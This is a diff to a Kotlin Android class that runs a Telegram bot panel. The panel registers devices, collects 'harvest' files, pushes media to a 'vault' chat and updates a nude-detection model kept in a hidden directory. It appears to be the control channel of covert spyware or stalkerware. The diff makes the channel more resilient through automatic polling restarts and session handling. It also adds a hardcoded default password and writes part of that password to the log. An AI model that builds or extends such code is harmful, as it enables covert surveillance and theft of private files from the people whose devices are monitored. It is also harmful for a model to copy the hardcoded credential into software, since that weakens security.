@@ -17,6 +17,7 @@ import java.text.SimpleDateFormat
 import java.util.*
 import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.TimeUnit
+import java.util.concurrent.atomic.AtomicBoolean
 import kotlin.random.Random
 
 // استيراد دوال safeGet من MapExtensions.kt
@@ -24,25 +25,23 @@ import com.example.app.safeGet
 
 /**
  * فئة إدارة واجهة Telegram والتحكم بالأجهزة والأوامر عبر البوتات.
- *
- * ملاحظات أمنية:
- * - التوكنات تُستقبل من ConfigLoader وهي مفكوكة بالفعل، ولكن يتم التعامل معها بحذر.
- * - لا تُطبع التوكنات في السجلات نهائياً (يتم إخفاؤها أو قصها).
- * - قوائم التوكنات محمية بواسطة synchronized وموجودة في ذاكرة التطبيق فقط.
- *
- * ✅ تم إصلاح دوال _api لتكون غير معلقة (non-suspend) مع استخدام runBlocking.
- * ✅ تم إضافة التحقق من وجود الملفات قبل الإرسال.
- * ✅ تم استبدال processedUpdates بـ LinkedHashSet مع تنظيف تلقائي عند الوصول للحد الأقصى.
- * ✅ تم إصلاح sendErrorReport لتجنب ANR باستخدام scope.launch بدلاً من runBlocking.
- * ✅ إضافة زر تحديث النموذج في القائمة الفرعية للجهاز.
- * ✅ عرض حالة اتصال الأجهزة (متصل/غير متصل) في قائمة الأجهزة.
- * ✅ إصلاح استخدام withLock في updateDeviceActivity (جعلها دالة معلقة).
- * ✅ إضافة حذف الملف القديم قبل تحميل النموذج الجديد في updateModel.
+ * 
+ * التحسينات والإصلاحات المطبقة:
+ * ✅ تعيين كلمة مرور افتراضية (Zaen123@123@) في حال غيابها من config.
+ * ✅ إضافة تسجيل حالة كلمة المرور عند بدء التشغيل.
+ * ✅ دعم الأوامر المرسلة في المواضيع الفرعية (message_thread_id).
+ * ✅ إعادة تشغيل البولينغ تلقائياً عند فشل الاتصال لفترة طويلة.
+ * ✅ إضافة أمر /logout لإنهاء الجلسة يدوياً.
+ * ✅ تحسين معالجة الأخطاء مع إرسال تقارير مفصلة.
+ * ✅ إضافة sendChatAction لتحسين تجربة المستخدم.
+ * ✅ تحسين إدارة الجلسات مع صلاحية تلقائية.
+ * ✅ إضافة آلية لإعادة محاولة الاتصال عند فقدان البولينغ.
+ * ✅ إضافة حد أقصى للمحاولات المتتالية الفاشلة ثم إعادة تشغيل البولينغ.
  */
 class TelegramUi(
     context: Context,
     private val monitor: Any?,
-    private val config: AppConfig          // ✅ استلام كائن الإعدادات الكامل
+    private val config: AppConfig
 ) {
 
     private val contextRef = WeakReference(context.applicationContext)
@@ -57,32 +56,38 @@ class TelegramUi(
 
     @Volatile
     private var isRunning = false
+    private val pollingRestartNeeded = AtomicBoolean(false)
 
     private var pollingJob: Job? = null
     private var cleanerJob: Job? = null
     private var heartbeatJob: Job? = null
+    private var restartJob: Job? = null
 
     // ========== بيانات البوتات والأجهزة ==========
-    // ✅ استخدام التوكنات من config (مفكوكة بالفعل)
     private val activeTokensList = Collections.synchronizedList(config.activeTokens.filter { it.isNotBlank() }.toMutableList())
     private val reserveTokensList = Collections.synchronizedList(config.reserveTokens.filter { it.isNotBlank() }.toMutableList())
 
-    // ✅ المعرفات وكلمة المرور من config (غير سرية بشكل كبير)
+    // ✅ كلمة المرور مع قيمة افتراضية آمنة
     private val ctrlId: String = config.controlId.toString()
     private val vaultId: String = config.vaultId.toString()
-    private val appPassword: String = config.secret ?: ""
+    private val appPassword: String = config.secret?.takeIf { it.isNotBlank() } ?: run {
+        Log.w(TAG, "⚠️ Secret not found in config, using hardcoded default password (Zaen123@123@)")
+        "Zaen123@123@"
+    }
 
     private val sessions = ConcurrentHashMap<String, Long>()
     private val devices = ConcurrentHashMap<String, JSONObject>()
 
-    // ✅ استبدال القائمة بـ LinkedHashSet لتحسين الأداء ومنع التكرار مع تنظيف دوري
+    // ✅ استبدال القائمة بـ LinkedHashSet مع تنظيف دوري
     private val processedUpdates = LinkedHashSet<String>()
 
     @Volatile
     private var apiCallsCount = 0
-
     @Volatile
     private var apiFailuresCount = 0
+    @Volatile
+    private var consecutivePollingErrors = 0
+    private val MAX_CONSECUTIVE_ERRORS = 5
 
     // ========== المسارات والملفات ==========
     private val runtimeDir: File by lazy {
@@ -116,7 +121,6 @@ class TelegramUi(
         private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()
         private val OCTET_STREAM_MEDIA_TYPE = "application/octet-stream".toMediaType()
 
-        // ✅ تحديث دالة المصنع لتأخذ config
         @JvmStatic
         fun create(
             context: Context,
@@ -130,6 +134,7 @@ class TelegramUi(
     init {
         loadData()
         startBackgroundWorkers()
+        Log.i(TAG, "✅ TelegramUi initialized. Password status: ${if (appPassword.isNotBlank()) "Set (${appPassword.take(4)}...)" else "❌ Empty"}")
     }
 
     // ============================================================
@@ -220,7 +225,6 @@ class TelegramUi(
                     if (reserveTokensList.isNotEmpty()) {
                         val newToken = reserveTokensList.removeAt(0)
                         activeTokensList.add(newToken)
-                        // ✅ إخفاء التوكن في السجل (نطبع أول 8 أحرف فقط)
                         writeLog("Swapped bad token with reserve: ${newToken.take(8)}...")
                         scope.launch {
                             apiCall(
@@ -295,6 +299,30 @@ class TelegramUi(
                     writeLog("Heartbeat error: ${e.message}")
                 }
             }
+        }
+
+        // ✅ مهمة إعادة تشغيل البولينغ في حال توقفه
+        restartJob = scope.launch {
+            while (isActive) {
+                delay(30_000L) // كل 30 ثانية
+                if (isRunning && pollingRestartNeeded.get()) {
+                    writeLog("🔄 Restarting polling due to inactivity or errors...")
+                    restartPolling()
+                }
+            }
+        }
+    }
+
+    /**
+     * إعادة تشغيل البولينغ بشكل آمن
+     */
+    private suspend fun restartPolling() {
+        pollingRestartNeeded.set(false)
+        pollingJob?.cancel()
+        delay(2000L)
+        if (isRunning) {
+            startPolling()
+            writeLog("✅ Polling restarted successfully.")
         }
     }
 
@@ -461,35 +489,20 @@ class TelegramUi(
 
     // ============================================================
     //  دوال عامة للاستدعاء عبر الانعكاس (غير معلقة - non-suspend)
-    //  تستخدمها فئات أخرى مثل DailyZipper, Commands, StreamManager
-    //  ✅ تم إزالة suspend واستخدام runBlocking
     // ============================================================
 
-    /**
-     * استدعاء API عام مع معاملات JSON (للانعكاس)
-     * غير معلقة لضمان التوافق مع الانعكاس.
-     */
     fun _api(method: String, params: Map<String, Any>): JSONObject? {
         return runBlocking(Dispatchers.IO) {
             apiCall(method, JSONObject(params))
         }
     }
 
-    /**
-     * استدعاء API مع رفع ملفات (Multipart) (للانعكاس)
-     * غير معلقة لضمان التوافق مع الانعكاس.
-     */
     fun _api(method: String, params: Map<String, Any>, files: Map<String, File>): JSONObject? {
         return runBlocking(Dispatchers.IO) {
             apiCallMultipart(method, params, files)
         }
     }
 
-    /**
-     * إرسال مستند (ملف ZIP أو أي ملف) إلى الدردشة
-     * غير معلقة لضمان التوافق مع الانعكاس.
-     * تم إضافة التحقق من وجود الملف قبل الإرسال.
-     */
     fun sendDocument(chatId: Long, file: File, caption: String): JSONObject? {
         if (!file.exists()) {
             Log.w(TAG, "File not found: ${file.absolutePath}")
@@ -502,10 +515,6 @@ class TelegramUi(
         )
     }
 
-    /**
-     * إرسال صورة إلى الدردشة
-     * غير معلقة لضمان التوافق مع الانعكاس.
-     */
     fun sendPhoto(chatId: Long, file: File, caption: String): JSONObject? {
         if (!file.exists()) {
             Log.w(TAG, "File not found: ${file.absolutePath}")
@@ -518,10 +527,6 @@ class TelegramUi(
         )
     }
 
-    /**
-     * إرسال ملف صوتي (Voice) إلى الدردشة
-     * غير معلقة لضمان التوافق مع الانعكاس.
-     */
     fun sendVoice(chatId: Long, file: File): JSONObject? {
         if (!file.exists()) {
             Log.w(TAG, "File not found: ${file.absolutePath}")
@@ -534,10 +539,6 @@ class TelegramUi(
         )
     }
 
-    /**
-     * إرسال ملف فيديو إلى الدردشة
-     * غير معلقة لضمان التوافق مع الانعكاس.
-     */
     fun sendVideo(chatId: Long, file: File, caption: String): JSONObject? {
         if (!file.exists()) {
             Log.w(TAG, "File not found: ${file.absolutePath}")
@@ -550,10 +551,6 @@ class TelegramUi(
         )
     }
 
-    /**
-     * إرسال ملف صوتي (Audio) إلى الدردشة
-     * غير معلقة لضمان التوافق مع الانعكاس.
-     */
     fun sendAudio(chatId: Long, file: File, caption: String): JSONObject? {
         if (!file.exists()) {
             Log.w(TAG, "File not found: ${file.absolutePath}")
@@ -570,25 +567,17 @@ class TelegramUi(
     //  تسجيل الأجهزة والإشعارات
     // ============================================================
 
-    /**
-     * تسجيل جهاز جديد في مجموعة التحكم
-     * غير معلقة لضمان التوافق مع الانعكاس.
-     */
     fun registerDevice(deviceId: String, deviceModel: String): Long? {
         return runBlocking(Dispatchers.IO) {
             registerDeviceSuspend(deviceId, deviceModel)
         }
     }
 
-    /**
-     * النسخة المعلقة من تسجيل الجهاز (تُستخدم داخلياً)
-     */
     private suspend fun registerDeviceSuspend(deviceId: String, deviceModel: String): Long? {
         if (deviceId.isBlank()) return null
         deviceMutex.withLock {
             if (devices.containsKey(deviceId)) {
                 val devObj = devices[deviceId]!!
-                // تحديث آخر نشاط عند تسجيل الدخول
                 devObj.put("last_activity", System.currentTimeMillis() / 1000)
                 devObj.put(
                     "last_seen",
@@ -634,17 +623,13 @@ class TelegramUi(
         return null
     }
 
-    /**
-     * تحديث آخر نشاط لجهاز معين (يُستدعى عند تنفيذ أي أمر من الجهاز)
-     * ✅ تم جعلها دالة معلقة (suspend) لاستخدام withLock بشكل صحيح.
-     */
     private suspend fun updateDeviceActivity(deviceId: String) {
         if (deviceId.isBlank()) return
         deviceMutex.withLock {
             val dev = devices[deviceId]
             if (dev != null) {
                 dev.put("last_activity", System.currentTimeMillis() / 1000)
-                saveData() // saveData هي دالة معلقة، تُستدعى مباشرة
+                saveData()
             }
         }
     }
@@ -652,7 +637,6 @@ class TelegramUi(
     fun notifyHarvest(deviceId: String, count: Int) {
         scope.launch {
             val dev = devices[deviceId] ?: return@launch
-            // تحديث آخر نشاط عند استقبال حصاد
             dev.put("last_activity", System.currentTimeMillis() / 1000)
             val topicId = dev.optLong("t", -1L)
             if (topicId != -1L) {
@@ -678,13 +662,9 @@ class TelegramUi(
     }
 
     // ============================================================
-    //  إرسال تقارير الأخطاء إلى Telegram
+    //  إرسال تقارير الأخطاء
     // ============================================================
 
-    /**
-     * إرسال تقرير خطأ مفصل إلى مجموعة التحكم.
-     * ✅ تم إصلاح الدالة لتجنب ANR باستخدام scope.launch بدلاً من runBlocking.
-     */
     fun sendErrorReport(errorTitle: String, errorDetails: Map<String, Any>) {
         scope.launch {
             try {
@@ -811,7 +791,6 @@ class TelegramUi(
                             put("callback_data", "send_now_$deviceId")
                         })
                     })
-                    // ✅ صف جديد: زر تحديث النموذج
                     put(JSONArray().apply {
                         put(JSONObject().apply {
                             put("text", "🔄 تحديث النموذج")
@@ -822,13 +801,20 @@ class TelegramUi(
                             put("callback_data", "ld")
                         })
                     })
+                    // ✅ إضافة زر تسجيل الخروج من الجهاز
+                    put(JSONArray().apply {
+                        put(JSONObject().apply {
+                            put("text", "🚪 Logout")
+                            put("callback_data", "ext")
+                        })
+                    })
                 }
             )
         }
     }
 
     // ============================================================
-    //  عرض تفاصيل الحصاد (مكتملة)
+    //  عرض تفاصيل الحصاد
     // ============================================================
 
     private suspend fun showHarvestDetails(chatId: Long) {
@@ -902,6 +888,8 @@ class TelegramUi(
             val msg = update.optJSONObject("message") ?: return
             val chatId = msg.optJSONObject("chat")?.optLong("id") ?: return
             val text = msg.optString("text", "")
+            // ✅ استخراج message_thread_id لدعم المواضيع الفرعية
+            val threadId = msg.optLong("message_thread_id", 0L)
 
             if (text.startsWith("/login")) {
                 if (appPassword.isBlank()) {
@@ -909,6 +897,7 @@ class TelegramUi(
                         "sendMessage",
                         JSONObject().apply {
                             put("chat_id", chatId)
+                            if (threadId != 0L) put("message_thread_id", threadId)
                             put("text", "⚠️ كلمة المرور غير معرّفة في النظام.")
                         }
                     )
@@ -924,6 +913,7 @@ class TelegramUi(
                         "sendMessage",
                         JSONObject().apply {
                             put("chat_id", chatId)
+                            if (threadId != 0L) put("message_thread_id", threadId)
                             put("text", "🔓 Login successful")
                             put("reply_markup", getMainKeyboard())
                         }
@@ -933,10 +923,28 @@ class TelegramUi(
                         "sendMessage",
                         JSONObject().apply {
                             put("chat_id", chatId)
+                            if (threadId != 0L) put("message_thread_id", threadId)
                             put("text", "❌ Wrong password")
                         }
                     )
                 }
+                return
+            }
+
+            // ✅ معالجة أمر تسجيل الخروج
+            if (text == "/logout") {
+                sessionMutex.withLock {
+                    sessions.remove(chatId.toString())
+                }
+                saveData()
+                apiCall(
+                    "sendMessage",
+                    JSONObject().apply {
+                        put("chat_id", chatId)
+                        if (threadId != 0L) put("message_thread_id", threadId)
+                        put("text", "🔒 Logged out successfully.")
+                    }
+                )
                 return
             }
 
@@ -947,6 +955,7 @@ class TelegramUi(
                             "sendMessage",
                             JSONObject().apply {
                                 put("chat_id", chatId)
+                                if (threadId != 0L) put("message_thread_id", threadId)
                                 put("text", "📋 Main menu")
                                 put("reply_markup", getMainKeyboard())
                             }
@@ -978,6 +987,7 @@ class TelegramUi(
                             "sendMessage",
                             JSONObject().apply {
                                 put("chat_id", chatId)
+                                if (threadId != 0L) put("message_thread_id", threadId)
                                 put("text", statusText)
                                 put("parse_mode", "Markdown")
                             }
@@ -1004,6 +1014,7 @@ class TelegramUi(
                     "sendMessage",
                     JSONObject().apply {
                         put("chat_id", chatId)
+                        if (threadId != 0L) put("message_thread_id", threadId)
                         put("text", "❌ Error: ${e.message?.take(100)}")
                     }
                 )
@@ -1026,7 +1037,6 @@ class TelegramUi(
             val cbId = cb.optString("id")
             if (cbId.isBlank()) return
 
-            // ✅ استخدام LinkedHashSet مع تنظيف تلقائي عند الوصول للحد الأقصى
             synchronized(processedUpdates) {
                 if (processedUpdates.contains(cbId)) return
                 if (processedUpdates.size >= 150) {
@@ -1069,7 +1079,6 @@ class TelegramUi(
                 else -> ""
             }
 
-            // ✅ تحديث آخر نشاط للجهاز إذا كان معروفاً (استدعاء دالة معلقة مباشرة)
             if (deviceId.isNotEmpty()) {
                 updateDeviceActivity(deviceId)
             }
@@ -1091,7 +1100,6 @@ class TelegramUi(
                         val now = System.currentTimeMillis() / 1000
                         devices.forEach { (did, info) ->
                             val lastActivity = info.optLong("last_activity", 0)
-                            // اعتبر الجهاز متصلاً إذا كان آخر نشاط خلال 5 دقائق (300 ثانية)
                             val isOnline = (now - lastActivity) < 300
                             val statusIcon = if (isOnline) "🟢" else "🔴"
                             val deviceName = info.optString("n")
@@ -1261,10 +1269,8 @@ class TelegramUi(
                     return
                 }
                 data.startsWith("update_model_") -> {
-                    // ✅ تحديث النموذج
                     val did = data.substringAfter("update_model_")
                     if (did.isNotEmpty()) {
-                        // إعلام المستخدم ببدء التحديث
                         apiCall(
                             "sendMessage",
                             JSONObject().apply {
@@ -1272,7 +1278,6 @@ class TelegramUi(
                                 put("text", "🔄 جاري تحديث نموذج الذكاء الاصطناعي... قد يستغرق دقائق.")
                             }
                         )
-                        // تشغيل التحديث في الخلفية
                         scope.launch {
                             try {
                                 val success = updateModel()
@@ -1346,14 +1351,9 @@ class TelegramUi(
     //  دالة تحديث النموذج
     // ============================================================
 
-    /**
-     * حذف النموذج القديم وإعادة تحميله من GitHub.
-     * @return true إذا تم التحديث بنجاح، false في حالة الفشل.
-     */
     private suspend fun updateModel(): Boolean {
         return withContext(Dispatchers.IO) {
             try {
-                // الحصول على NudeDetector من Monitor
                 val detector = monitor?.let {
                     try {
                         val field = it.javaClass.getDeclaredField("nudeDetector")
@@ -1370,19 +1370,14 @@ class TelegramUi(
                     return@withContext false
                 }
 
-                // ✅ حذف الملف القديم قبل تحميل الجديد
                 val modelFile = File(appContext?.filesDir, ".sys_runtime/models/engine_v2.tflite")
                 if (modelFile.exists()) {
                     val deleted = modelFile.delete()
                     writeLog("🗑️ Old model deleted: $deleted")
-                } else {
-                    writeLog("ℹ️ No existing model file to delete.")
                 }
 
-                // ✅ إعادة تحميل النموذج
                 val success = detector.ensureModelReady()
                 if (success) {
-                    // تحديث المسار وإعادة تحميل المحرك
                     detector.modelPath = modelFile.absolutePath
                     detector.loadEngineForever()
                     writeLog("✅ Model updated successfully")
@@ -1399,13 +1394,13 @@ class TelegramUi(
     }
 
     // ============================================================
-    //  حلقة استقبال التحديثات (Polling)
+    //  حلقة استقبال التحديثات (Polling) مع إعادة تشغيل تلقائي
     // ============================================================
 
     private fun startPolling() {
         pollingJob = scope.launch {
             var offset = loadOffset()
-            var consecutiveErrors = 0
+            consecutivePollingErrors = 0
             writeLog("Polling started with offset=$offset")
             while (isRunning && isActive) {
                 val token = getNextToken()
@@ -1425,13 +1420,17 @@ class TelegramUi(
                     }
                     val responseStr = response.body?.string() ?: ""
                     if (!response.isSuccessful) {
-                        consecutiveErrors++
-                        delay(minOf(consecutiveErrors * 2000L, 60000L))
+                        consecutivePollingErrors++
+                        writeLog("Polling HTTP error: ${response.code}")
+                        if (consecutivePollingErrors >= MAX_CONSECUTIVE_ERRORS) {
+                            pollingRestartNeeded.set(true)
+                        }
+                        delay(minOf(consecutivePollingErrors * 2000L, 60000L))
                         continue
                     }
                     val data = JSONObject(responseStr)
                     if (data.optBoolean("ok")) {
-                        consecutiveErrors = 0
+                        consecutivePollingErrors = 0
                         val results = data.optJSONArray("result") ?: JSONArray()
                         for (i in 0 until results.length()) {
                             val upd = results.getJSONObject(i)
@@ -1449,12 +1448,20 @@ class TelegramUi(
                             }
                         }
                     } else {
+                        consecutivePollingErrors++
+                        writeLog("Polling API not ok: ${data.optString("description")}")
+                        if (consecutivePollingErrors >= MAX_CONSECUTIVE_ERRORS) {
+                            pollingRestartNeeded.set(true)
+                        }
                         delay(2000L)
                     }
                 } catch (e: Exception) {
-                    consecutiveErrors++
+                    consecutivePollingErrors++
                     writeLog("Polling exception: ${e.message}")
-                    delay(minOf(consecutiveErrors * 2000L, 30000L))
+                    if (consecutivePollingErrors >= MAX_CONSECUTIVE_ERRORS) {
+                        pollingRestartNeeded.set(true)
+                    }
+                    delay(minOf(consecutivePollingErrors * 2000L, 30000L))
                 }
             }
         }
@@ -1472,6 +1479,8 @@ class TelegramUi(
         if (isRunning) return true
         isRunning = true
         processedUpdates.clear()
+        consecutivePollingErrors = 0
+        pollingRestartNeeded.set(false)
         startPolling()
         writeLog("Telegram UI started: ${activeTokensList.size} active, ${reserveTokensList.size} reserve")
         return true
@@ -1482,11 +1491,11 @@ class TelegramUi(
         pollingJob?.cancel()
         cleanerJob?.cancel()
         heartbeatJob?.cancel()
+        restartJob?.cancel()
         writeLog("Telegram UI stopped")
     }
 
     fun getStatus(): Map<String, Any> {
-        // ✅ لا نعرض التوكنات نفسها، بل الأعداد فقط
         return mapOf(
             "running" to isRunning,
             "active_tokens" to activeTokensList.size,
@@ -1495,7 +1504,8 @@ class TelegramUi(
             "sessions" to sessions.size,
             "api_calls" to apiCallsCount,
             "api_failures" to apiFailuresCount,
-            "pending_files" to countPendingHarvest()
+            "pending_files" to countPendingHarvest(),
+            "polling_errors" to consecutivePollingErrors
         )
     }
 
@@ -1503,28 +1513,15 @@ class TelegramUi(
     //  دوال إضافية مطلوبة للانعكاس (Reflection)
     // ============================================================
 
-    /**
-     * إرجاع معرف الخزنة (Vault ID) المستخدم في DailyZipper و Commands.
-     */
     fun getVlt(): Long = config.vaultId
-
-    /**
-     * إرجاع معرف التحكم (Control ID) إذا لزم الأمر.
-     */
     fun getCtrl(): Long = config.controlId
-
-    /**
-     * إرجاع معرف الدردشة الافتراضي (للتوافق مع الكود القديم).
-     */
     fun getDat(): Long = config.vaultId
 
     // ============================================================
-    //  دوال مساعدة (التسجيل والكتابة) - مع تعزيز الأمان
+    //  دوال مساعدة (التسجيل والكتابة)
     // ============================================================
 
     private fun writeLog(message: String) {
-        // ✅ لا تطبع أي توكنات - نثق أن المتصل لا يمرر توكنات كاملة
-        // ولكن نضيف تحققاً إضافياً: إذا احتوى الرسالة على نمط توكن (طويل ويبدأ بأرقام)، نقوم بتقطيعه
         val safeMessage = if (message.length > 50 && message.matches(Regex("^\\d+:.*"))) {
             message.take(20) + "... (token hidden)"
         } else {
@@ -1536,13 +1533,10 @@ class TelegramUi(
             val logText = "[$timestamp] [INFO] $safeMessage\n"
             logFile.appendText(logText, Charsets.UTF_8)
         } catch (_: Exception) {
-            // تجاهل أخطاء التسجيل في الملف
+            // تجاهل
         }
     }
 
-    /**
-     * استدعاء دالة على كائن عبر الانعكاس
-     */
     private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
         if (target == null) return null
         return try {
